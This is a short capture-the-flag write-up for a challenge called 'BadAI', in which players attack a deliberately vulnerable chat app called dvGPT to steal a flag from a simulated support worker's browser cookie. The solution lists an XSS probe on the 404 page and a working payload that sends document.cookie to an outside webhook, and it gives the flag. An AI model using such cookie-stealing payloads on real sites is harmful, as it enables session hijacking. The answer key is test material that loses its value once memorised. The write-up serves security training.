# BadAI - 150pts
### 01-G-JWJCK
Author: Nate Singer (Helix)<br>
Challenge Resources: [./resources/app-1_dvgpt/](./resources/app-1_dvgpt/)

ChatGPT is a powerful tool for nearly anything you can imagine, is it really secure?

## Challenge Prompt
So we have this guy named Bill that works here--he handles the support tickets for dvGPT. If you have any problems let us know and Bill will check it out. Bill does nothing but stare at the ticket feed, so you can expect him to check your request within a couple seconds.

Bill can only view pages from dvGPT though, so don't bother sending him anything else.

*The flag is stored in a cookie in Bill's browser.*

## Solution Guide
1. Identify XSS vulnerability in the 404 page with the payload: `http://192.168.1.65:5000/%3Cimg%20src=x%20onerror=%22alert(1)%22%3E`
2. Use a bit of javascript to steal Bill's session cookies and send them to a webhook:
`https://wtashuxsyj.final.hackabit.com/<img src='x' onerror="location.href='http://requestinspector.com/inspect/01h06rzem65z0hvcknwd851ss8/'+document.cookie;" />`

flag: `flag{mirroring_to_the_max}`
